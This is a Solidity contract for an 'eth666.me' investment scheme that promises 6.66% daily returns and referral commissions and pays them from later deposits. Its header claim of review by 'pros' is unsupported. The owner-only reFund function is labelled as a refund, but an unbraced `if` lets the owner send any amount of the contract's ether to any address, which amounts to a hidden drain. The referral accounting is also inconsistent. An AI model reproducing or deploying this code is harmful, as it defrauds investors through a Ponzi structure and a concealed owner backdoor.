pragma solidity ^0.4.25;

/** 
 * contract for eth666.me
 * GAIN 6.66% PER 24 HOURS (every 5900 blocks)
 * 
 *  How to use:
 *  1. Send any amount of ether to make an investment
 *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don&#39;t care unless you&#39;re spending too much on GAS)
 *  OR
 *  2b. Send more ether to reinvest AND get your profit at the same time
 *
 * 
 *  5% for every deposit of your direct partners
 *  If you want to invite your partners to join our program ,They have to specify your ETH wallet in a "DATA" field during a deposit transaction.
 * 
 * 
 * RECOMMENDED GAS LIMIT: 70000
 * RECOMMENDED GAS PRICE: https://ethgasstation.info/
 *
 * Contract reviewed and approved by pros!
**/

contract eth666{

    address public owner;
    address public partner;    
    
	mapping (address => uint256) deposited;
	mapping (address => uint256) withdrew;
	mapping (address => uint256) refearned;
	mapping (address => uint256) blocklock;

	uint256 public totalDepositedWei = 0;
	uint256 public totalWithdrewWei = 0;
	uint256 public investorNum = 0;
	
	//if isStart = 0 !!!!DO NOT INVEST!!!! please wait for gameStart()
	uint 	public isStart; 

	event invest(address indexed beneficiary, uint amount);

    constructor () public {
        owner   = msg.sender;
        partner = msg.sender;
        isStart = 0;
    }
    
    modifier onlyOwner {
        require (msg.sender == owner, "OnlyOwner methods called by non-owner.");
        _;
    }    
    
    //if you want to be a partner , contact admin
    function setPartner(address newPartner) external onlyOwner {
        partner = newPartner;
    }
 
 	function gameStart(uint num) external onlyOwner{
 		isStart = num;
 	}

	function() payable external {
		emit invest(msg.sender,msg.value);
		uint256 admRefPerc = msg.value / 10;
		uint256 advPerc    = msg.value / 20;

		owner.transfer(admRefPerc);
		partner.transfer(advPerc);

		if (deposited[msg.sender] != 0 && isStart != 0) {
			address investor = msg.sender;
            // calculate profit amount as such:
            // amount = (amount invested) * 6.66% * (blocks since last transaction) / 5900
            // 5900 is an average block count per day produced by Ethereum blockchain
            uint256 depositsPercents = deposited[msg.sender] * 666 / 10000 * (block.number - blocklock[msg.sender]) /5900;
			investor.transfer(depositsPercents);

			withdrew[msg.sender] += depositsPercents;
			totalWithdrewWei += depositsPercents;
		} else if (deposited[msg.sender] == 0 && isStart != 0)
			investorNum += 1;

		address referrer = bytesToAddress(msg.data);
		if (referrer > 0x0 && referrer != msg.sender) {
			referrer.transfer(admRefPerc);
			refearned[referrer] += advPerc;
		}

		blocklock[msg.sender] = block.number;
		deposited[msg.sender] += msg.value;
		totalDepositedWei += msg.value;
	}
	
	//refund to user who misunderstood the game . &#39;withdrew&#39; must = 0
    function reFund(address exitUser, uint a) external onlyOwner {
        uint256 c1 = withdrew[exitUser];
        if(c1 == 0)
          uint256 reFundValue = deposited[exitUser];
          exitUser.transfer(a);
          deposited[exitUser] = 0;
    }
    
	function userDepositedWei(address _address) public view returns (uint256) {
		return deposited[_address];
    }

	function userWithdrewWei(address _address) public view returns (uint256) {
		return withdrew[_address];
    }

	function userDividendsWei(address _address) public view returns (uint256) {
        return deposited[_address] * 666 / 10000 * (block.number - blocklock[_address]) / 5900;
    }

	function userReferralsWei(address _address) public view returns (uint256) {
		return refearned[_address];
    }

	function bytesToAddress(bytes bys) private pure returns (address addr) {
		assembly {
			addr := mload(add(bys, 20))
		}
	}
}